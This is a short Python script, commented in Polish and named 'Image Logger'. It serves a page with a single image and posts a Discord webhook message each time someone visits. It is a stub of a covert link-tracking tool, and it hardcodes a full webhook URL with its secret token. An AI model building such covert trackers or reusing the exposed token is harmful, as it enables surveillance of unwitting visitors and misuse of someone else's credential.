from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1351963908990304428/CkNe2L4TpN9e0-i2wRe5cy13LBxXPRs9qE6q2eWhsII0Qv1Hg7U6xRhtKCy8l9EgAlMB"  # wstaw swój webhook
IMAGE_URL = "https://cdn.discordapp.com/attachments/1383724793731350578/1407363234708717658/image.png?ex=68a5d4a6&is=68a48326&hm=679807251bad9f15bf906d681bf5e1ead9c4b4b26ec56ad28ae34b561b5c3a75&"  # URL obrazka

def handler(request, response):
    # Wyślij webhook do Discorda
    payload = {
        "username": "Image Logger",
        "content": "test",
        "embeds": [
            {
                "title": "Ktoś odwiedził stronę!",
                "color": 0x00FFFF,
                "image": {"url": IMAGE_URL}
            }
        ]
    }
    requests.post(WEBHOOK_URL, json=payload)
    
    # Zwróć HTML z obrazkiem
    html = f"""
    <html>
        <head><title>Obrazek</title></head>
        <body style="margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#000;">
            <img src="{IMAGE_URL}" style="max-width:100%; max-height:100%;" />
        </body>
    </html>
    """
    
    response.status_code = 200
    response.headers["Content-Type"] = "text/html"
    response.send(html)
